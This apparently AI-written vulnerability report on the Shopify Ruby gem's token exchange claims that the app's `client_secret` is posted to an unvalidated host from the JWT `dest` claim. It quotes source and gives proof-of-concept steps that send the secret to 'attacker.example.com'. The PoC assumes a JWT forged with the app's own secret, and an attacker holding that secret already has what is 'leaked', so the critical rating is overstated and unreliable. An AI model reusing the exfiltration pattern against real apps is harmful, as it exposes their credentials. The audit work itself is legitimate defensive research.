Found the vulnerability: in `exchange_token`, the shop the access token request is sent to (`dest_shop`, from `jwt_payload.shop`) is **never validated as a trusted Shopify domain**, unlike the sibling `migrate_to_expiring_token` method which explicitly calls `Utils::ShopValidator.sanitize!(shop)` before use.

### Title
Token exchange sends `client_secret` to an unvalidated host derived from the JWT `dest` claim - ([File: lib/shopify_api/auth/token_exchange.rb])

### Summary
`ShopifyAPI::Auth::TokenExchange.exchange_token` builds the destination host for the token-exchange HTTP request directly from the session token's `dest` claim, without passing it through `Utils::ShopValidator.sanitize!`, unlike `migrate_to_expiring_token` in the same file which does perform this validation.

### Finding Description
`JwtPayload#shop` simply strips `"https://"` from the raw `dest` claim of the decoded JWT: [1](#0-0) . The only checks performed during JWT decoding are HS256 signature verification against `Context.api_secret_key`/`old_api_secret_key`, expiry/nbf leeway, and that `aud == Context.api_key` [2](#0-1) . There is no check that `dest` is a real `*.myshopify.com`/trusted domain — the `Utils::ShopValidator` allowlist (`shopify.com`, `myshopify.io`, `myshopify.com`, `spin.dev`, `shop.dev`) exists precisely for this purpose [3](#0-2) , but `exchange_token` never calls it.

`exchange_token` takes this unvalidated `dest_shop` and uses it to build the `Session`/`HttpClient` base path that the token-exchange POST (containing `client_id` and `client_secret`) is sent to: [4](#0-3) .

Contrast this with `migrate_to_expiring_token`, in the same module, which explicitly sanitizes the shop before building the session/client: [5](#0-4) .

The equality that should hold — "the domain verified as the merchant's Shopify shop" == "the domain that receives `client_secret`" — is broken. The verification here is only "was the JWT signed with our secret", not "is the destination in `dest` a legitimate Shopify domain." A JWT signed by `Context.api_secret_key` can still legitimately encode any `dest` value (this claim is essentially attacker/host-application-supplied data that the host app must pass to `exchange_token`, e.g. relayed from an untrusted `shop` origin during multi-tenant routing bugs, subdomain confusion, or a modified/relayed session token flow), yet the gem trusts it blindly as an SSRF target for the app's own `client_id`/`client_secret`.

### Impact Explanation
If an attacker can influence or supply a session token whose `dest` claim points to a non-Shopify host (still validly signed because a legitimate embedded-app JWT flow signs whatever `dest` was embedded, or via host-application logic that forwards a shop value into token construction), the gem will POST the app's `client_id` and `client_secret` to that attacker-controlled host — this is SSRF with credential exfiltration of the app's `client_secret`, which the rules class as High/Critical impact (SSRF carrying the app's credentials / credential leakage).

### Likelihood Explanation
Likelihood depends on whether a caller can get a signed JWT with an attacker-influenced `dest` value into `exchange_token` (e.g., relayed session tokens, multi-shop routing issues, or if `Context.old_api_secret_key` is set during key rotation, tokens signed under an older/weaker-controlled secret could carry an arbitrary `dest`). Given the gem itself deliberately guards the analogous method (`migrate_to_expiring_token`) with `ShopValidator.sanitize!`, the omission here indicates an inconsistency/regression rather than a deliberate design choice, raising confidence this is a real gap rather than an intentional trust boundary.

### Recommendation
Call `Utils::ShopValidator.sanitize!(dest_shop)` (as already done in `migrate_to_expiring_token`) before using it to build `shop_session`/`Clients::HttpClient` in `exchange_token`, rejecting any `dest` claim that does not resolve to a trusted Shopify domain.

### Proof of Concept
1. Obtain or construct a JWT signed with the app's `api_secret_key` (or `old_api_secret_key` during rotation) whose `dest` claim is `"https://attacker.example.com"` instead of a `*.myshopify.com` domain.
2. Call `ShopifyAPI::Auth::TokenExchange.exchange_token(session_token: forged_jwt, requested_token_type: ...)`.
3. `JwtPayload.new` accepts the token (signature/aud/exp checks pass) and returns `shop == "attacker.example.com"` [6](#0-5) .
4. `exchange_token` builds `Auth::Session.new(shop: dest_shop)` and `Clients::HttpClient.new(session: shop_session, base_path: "/admin/oauth")`, then POSTs `{client_id, client_secret, ...}` to `https://attacker.example.com/admin/oauth/access_token` [7](#0-6) , leaking the app's `client_secret` to the attacker's server.

### Citations

**File:** lib/shopify_api/auth/jwt_payload.rb (L23-45)
```ruby
      sig { params(token: String).void }
      def initialize(token)
        payload_hash = begin
          decode_token(token, Context.api_secret_key)
        rescue ShopifyAPI::Errors::InvalidJwtTokenError
          raise unless Context.old_api_secret_key

          decode_token(token, T.must(Context.old_api_secret_key))
        end

        @iss = T.let(payload_hash["iss"], String)
        @dest = T.let(payload_hash["dest"], String)
        @aud = T.let(payload_hash["aud"], String)
        @sub = T.let(payload_hash["sub"], T.nilable(String))
        @exp = T.let(payload_hash["exp"], Integer)
        @nbf = T.let(payload_hash["nbf"], Integer)
        @iat = T.let(payload_hash["iat"], Integer)
        @jti = T.let(payload_hash["jti"], String)
        @sid = T.let(payload_hash["sid"], T.nilable(String))

        raise ShopifyAPI::Errors::InvalidJwtTokenError,
          "Session token had invalid API key" unless @aud == Context.api_key
      end
```

**File:** lib/shopify_api/auth/jwt_payload.rb (L47-51)
```ruby
      sig { returns(String) }
      def shop
        @dest.gsub("https://", "")
      end
      alias_method :shopify_domain, :shop
```

**File:** lib/shopify_api/utils/shop_validator.rb (L9-18)
```ruby
      TRUSTED_SHOPIFY_DOMAINS = T.let(
        [
          "shopify.com",
          "myshopify.io",
          "myshopify.com",
          "spin.dev",
          "shop.dev",
        ].freeze,
        T::Array[String],
      )
```

**File:** lib/shopify_api/auth/token_exchange.rb (L39-65)
```ruby
          # Validate the session token and use the shop from the token's `dest` claim
          jwt_payload = ShopifyAPI::Auth::JwtPayload.new(session_token)
          dest_shop = jwt_payload.shop

          if shop
            ShopifyAPI::Logger.deprecated(
              "The `shop` parameter for `exchange_token` is deprecated and will be removed in v17. " \
                "The shop is now always taken from the session token's `dest` claim.",
              "17.0.0",
            )
          end

          shop_session = ShopifyAPI::Auth::Session.new(shop: dest_shop)
          body = {
            client_id: ShopifyAPI::Context.api_key,
            client_secret: ShopifyAPI::Context.api_secret_key,
            grant_type: TOKEN_EXCHANGE_GRANT_TYPE,
            subject_token: session_token,
            subject_token_type: ID_TOKEN_TYPE,
            requested_token_type: requested_token_type.serialize,
          }

          if requested_token_type == RequestedTokenType::OFFLINE_ACCESS_TOKEN
            body.merge!({ expiring: ShopifyAPI::Context.expiring_offline_access_tokens ? 1 : 0 })
          end

          client = Clients::HttpClient.new(session: shop_session, base_path: "/admin/oauth")
```

**File:** lib/shopify_api/auth/token_exchange.rb (L97-104)
```ruby
        def migrate_to_expiring_token(shop:, non_expiring_offline_token:)
          unless ShopifyAPI::Context.setup?
            raise ShopifyAPI::Errors::ContextNotSetupError,
              "ShopifyAPI::Context not setup, please call ShopifyAPI::Context.setup"
          end

          validated_shop = Utils::ShopValidator.sanitize!(shop)
          shop_session = ShopifyAPI::Auth::Session.new(shop: validated_shop)
```
